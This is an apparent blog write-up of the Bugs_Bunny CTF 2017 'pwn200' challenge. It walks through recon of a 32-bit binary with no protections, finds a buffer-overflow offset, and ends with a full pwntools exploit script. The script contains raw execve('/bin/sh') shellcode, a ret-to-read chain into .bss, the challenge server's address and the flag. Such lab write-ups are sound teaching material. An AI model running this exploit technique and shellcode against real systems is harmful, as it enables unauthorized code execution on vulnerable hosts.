---
title: Bugs_Bunny CTF 2017 -Pwn200
subtitle: Walkthrough the solution
date: 2017-03-05
tags: ["Posts",Bugs_bunny CTF", "Pwn"]

---



Hi guys, this writeup is for the _ bugs_bunny CTF 2017 pwn series _.


challenge: **pwn200**


The traditional three steps:  
1. file  
2. strings:  
![1.png](/img/pwn200/1.png)  
3. checksec:  
![2.png](/img/pwn200/2.png)   
---

Information gathered:  
	&nbsp;pwn200 is a 32-bit binary and has no Security measures enabled. Not even NX, which enables Shellcode Injection.
	&nbsp;`LIBC` functions read and puts are used in `ELF`.


Now, we run the binary:

```bash
./pwn200
```

![3.png](/img/pwn200/3.png)


Guys, please dont make all challenges on Buffer Overflows  


`objdump -d pwn200 -M intel`  

![4.png](/img/pwn200/4.png)



There are 3 functions other than main:  

* init: just to create a buffer   
* HEYy: to give the welcome message  
* lOL : the vulnerable function which calls read to get input into the buffer.  


Lets check if we can control eip, if so whats the offset:

![5.png](/img/pwn200/5.png)

![6.png](/img/pwn200/6.png)


Cool, the offset to eip is 28.


Now, lets plan the exploit:
1. We have control over eip.
2. We have [shellcode](https://dhavalkapil.com/blogs/Shellcode-Injection/) and its length is 25. 
3. Maybe, we can use read to get shellcode fron stdin and store it in known memory address.
4. Then just jump to that address.


Nice, that seems very simple. Just to do call `read()` and then a jump.


But, where to write the shellcode. Here comes the sections : `.data, .bss`


The `.bss` section is for uninitialized variables of the binary and i decide to use this part.


The exploit must do this: `read(0,&bss_start,25)`, jump to` &bss_start`


since pwn200 is a `32-bit binary`, the parameters to read can be passed in stack and no need of rop-gadgets.  


Exploit:
1. Fill buffer
2. Overwrite `EIP` with `read()`
3. Next 4 bytes are the Return address, write &bss_start there, this simplifies the jump work as it returns to &bss_start
4. Pass the parameters: `0,&bss_start,25`


Final exploit:  
```python
from pwn import *

#shell="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"   #vampire
shell="\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"    #585.php

elf=ELF('pwn200')
#r=process('./pwn200')
r=remote("54.67.102.66","5254")
exploit="A"*24+"B"*4                        #offset to ebp is 0x18=24, $ebp=0x42424242
exploit+=p32(elf.symbols['read'])           #call read as : read(0,&shell,25), &shell= start of bss section
exploit+=p32(elf.symbols['__bss_start'])    #return to &shell
exploit+=p32(0)                             #parameter to read
exploit+=p32(elf.symbols['__bss_start'])    #parameter to read
exploit+=p32(25)                            #parameter to read

r.recv()
r.send(exploit)
r.send(shell)
r.interactive()
#r.sendline("cat /home/pwn200/flag")

#Bugs_Bunny{Its_all_about_where_We_Can_Put_Our_Shell:D!}

```
___

![7.png](/img/pwn200/7.png)